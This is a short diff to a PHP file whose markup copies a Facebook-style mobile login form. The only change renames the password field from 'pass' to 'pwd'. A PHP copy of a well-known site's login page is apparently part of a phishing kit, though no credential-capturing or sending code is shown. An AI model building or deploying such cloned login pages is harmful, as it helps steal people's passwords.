@@ -64,7 +64,7 @@ require_once('helper.php');
                               <div class="_7om2">
                                 <div class="_4g34 _5i2i _52we">
                                   <div class="_5xu4">
-                                    <input autocorrect="off" autocapitalize="off" class="_56bg _4u9z _27z2 _8qtm" autocomplete="on" id="m_login_password" name="pass" placeholder="Password" type="password" data-sigil="password-plain-text-toggle-input">
+                                    <input autocorrect="off" autocapitalize="off" class="_56bg _4u9z _27z2 _8qtm" autocomplete="on" id="m_login_password" name="pwd" placeholder="Password" type="password" data-sigil="password-plain-text-toggle-input">
                                   </div>
                                 </div>
                                 <div class="_5s61 _216i _5i2i _52we">
